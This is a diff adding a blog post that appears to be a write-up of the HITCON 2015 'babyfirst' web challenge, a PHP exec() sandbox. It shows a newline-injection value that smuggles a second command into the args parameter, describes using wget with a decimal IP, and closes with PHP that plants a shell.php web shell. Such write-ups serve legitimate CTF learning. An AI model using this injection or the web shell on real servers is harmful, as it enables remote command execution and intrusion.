@@ -1,0 +1,61 @@
+---
+layout:     post
+title:      "Web 100 baby first"
+subtitle:   "Hitcon Ctf"
+date:       2015-10-15 18:14:00
+author:     "Heeraj"
+header-img: "img/post-bg-02.png"
+---
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- ad -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-0540814478217300"
+     data-ad-slot="5956699124"
+     data-ad-format="auto"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+<p> If you like to read our old blogs you are welcome, <a href="http://heeraj123.wordpress.com">I4INFO</a> </p>
+
+<p>This CTF challenges were very cool, I liked the challenges. I would like write today on web 100 , baby first challenge. I spend most of my time solving this  challenge, but I didn't get it.</p>
+
+<p>Source Code:<br>
+&#x3C;?php
+    highlight_file(__FILE__);
+
+    $dir = &#x27;sandbox/&#x27; . $_SERVER[&#x27;REMOTE_ADDR&#x27;];
+    if ( !file_exists($dir) )
+        mkdir($dir);
+    chdir($dir);
+
+    $args = $_GET[&#x27;args&#x27;];
+    for ( $i=0; $i&#x3C;count($args); $i++ ){
+        if ( !preg_match(&#x27;/^\w+$/&#x27;, $args[$i]) )
+            exit();
+    }
+    exec(&#x22;/bin/orange &#x22; . implode(&#x22; &#x22;, $args));
+?&#x3E;
+
+<p>During CTF, when I got the problem source code was visible due to the "highlight_file" function in php. After that it had function to make the directory. Butwhen I deployed the challenge, there was no directory created. </p>
+
+<p>The argument were passed through the GET parameter, then there is for loop which loops till count of arguments. Everything was "0k" till now, exept the preg_match() which was filtering only the letters, characters and digits. This was a tension, I have to somehow bypass the preg_match() function.</p>
+
+<p>Ya this was hard phase, because after this function you have exec() which executes the command. But in the case here, there is /bin/orange , I don't know what was orange  anyway. I was think to use && or ; but that would not work.</p>
+
+<p>For bypassing this function, we have to pass the argument as args[]=a%0A&args[]=touch&args[]=i4info. So now the problem was, what to do next? You can neither use dot or anyother command which would help us. But only thing we could do was , we have to use wget command but for that also, you would have give an IP addrss which don't contain dot. That's intresting an IP without dots.</p>
+
+<p>This was totally new concept, we have to use something called resolving ip. Thus we can make the ip to long number format. Thus we can execute the wget command. You could do this all in folder such that you can make it a tar and execute php of the tar, anyway php will be executed. The exploit to be taken while wget is given below. Its really superb problem, the way of thinking that we take is very nice.</p>
+
+<p>Exploit:
+&#x3C;?php
+file_put_contents(&#x27;shell.php&#x27;, &#x27;
+    &#x3C;?php
+    header(&#x22;Content-Type: text/plain&#x22;);
+    print shell_exec($_GET[&#x22;cmd&#x22;]);
+    ?&#x3E;
+&#x27;);
+?&#x3E;
+</p>
+
+<p>Thank you for reading the blog! </p>
